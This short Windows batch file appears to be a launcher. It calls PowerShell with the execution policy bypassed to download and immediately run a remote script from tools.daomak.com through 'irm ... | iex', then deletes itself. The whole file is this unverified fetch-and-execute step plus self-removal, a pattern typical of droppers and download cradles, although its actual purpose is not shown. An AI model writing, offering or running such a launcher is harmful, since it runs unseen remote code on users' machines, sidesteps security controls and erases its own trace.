@echo off
chcp 65001 >nul

if exist "%SystemRoot%\SysNative\WindowsPowerShell\v1.0\powershell.exe" (
    "%SystemRoot%\SysNative\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -ExecutionPolicy Bypass -Command "irm https://tools.daomak.com/boot.ps1 | iex"
) else (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://tools.daomak.com/boot.ps1 | iex"
)

del "%~f0"
